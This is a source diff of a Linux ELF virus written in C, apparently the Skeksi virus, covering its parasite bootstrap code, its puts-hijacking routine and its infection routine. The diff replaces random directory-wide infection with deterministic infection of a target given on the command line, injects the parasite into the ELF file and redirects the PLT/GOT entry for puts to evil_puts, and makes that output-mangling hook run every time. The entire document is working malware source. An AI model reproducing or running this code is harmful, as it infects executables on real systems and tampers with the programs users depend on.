@@ -140,9 +140,7 @@ typedef struct elfbin {
 
 _start()
 {
-#if 0
 	struct bootstrap_data bootstrap;
-#endif
 	/*
 	 * Save register state before executing parasite
 	 * code.
@@ -165,19 +163,15 @@ _start()
 	 "push %r14	\n"
 	 "push %r15	  ");
 	
-#if 0
 	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
         __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
-#endif
 	/*
 	 * Load bootstrap pointer as argument to do_main()
 	 * and call it.
 	 */
 	__ASM__ ( 
-#if 0
 	 "leaq %0, %%rdi\n"
-#endif
-	 "call do_main   " //:: "g"(bootstrap)
+	 "call do_main   " :: "g"(bootstrap)
 	);
 	/*
 	 * Restore register state
@@ -212,10 +206,6 @@ int evil_puts(const char *string)
 	char *s = (char *)string;
 	char new[1024];
 	int index = 0;
-	int rnum = get_random_number(5);
-	if (rnum != 3)
-		goto normal;
-
 	Memset(new, 0, 1024);
 	while (*s != '\0' && index < 1024) {
 		switch(_toupper(*s)) {
@@ -244,8 +234,6 @@ int evil_puts(const char *string)
 		s++;
 	}
 	return _puts_nl(new);
-normal:
-	return _puts_nl((char *)string);
 }
 
 /*
@@ -741,56 +729,19 @@ rescan:
 	}
 	
 	load_self(&self);
-	
-	for (;;) {
-		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768);
-		if (nread < 0) {
-			DEBUG_PRINT("getdents64 failed\n");
-			return;
-		}
-		if (nread == 0)
-			break;
-		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
-			d = (struct linux_dirent64 *) (dbuf + bpos);
-    			bpos += d->d_reclen - 1;
-			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) 
-				continue;
-			if (d->d_name[0] == '.')
-				continue;
-			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
-				continue; 
-			if (icount == 0)
-				goto infect;
-			rnum = get_random_number(10);
-                        if (rnum != LUCKY_NUMBER)
-                                continue;
-infect:
-			load_target(fpath, &target);
-			new_base = infect_elf_file(&self, &target);
-			unload_target(&target);
-#ifdef INFECT_PLTGOT
-			load_target_writeable(TMP, &target);
-			base_addr = PIC_RESOLVE_ADDR(&_start);
-			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
-			evilputs_offset = evilputs_addr - base_addr;
-			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
-			unload_target(&target);
-#endif
-
-			_rename(TMP, fpath);
-			icount++;
-		}
-		
+	fpath = bootstrap->argv[1];	
+	if (check_criteria(fpath) == 0) {
+		load_target(fpath, &target);
+		new_base = infect_elf_file(&self, &target);
+		unload_target(&target);
+		load_target_writeable(TMP, &target);
+		base_addr = PIC_RESOLVE_ADDR(&_start);
+		evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
+		evilputs_offset = evilputs_addr - base_addr;
+		infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
+		unload_target(&target);
+		_rename(TMP, fpath);
 	}
-	if (--scan_count > 0) {
-		_close(dd);
-		goto rescan;
-	}
-
-	rnum = get_random_number(50);
-	if (rnum == LUCKY_NUMBER) 
-		display_skeksi();
-	
 }
 
 int _getuid(void)
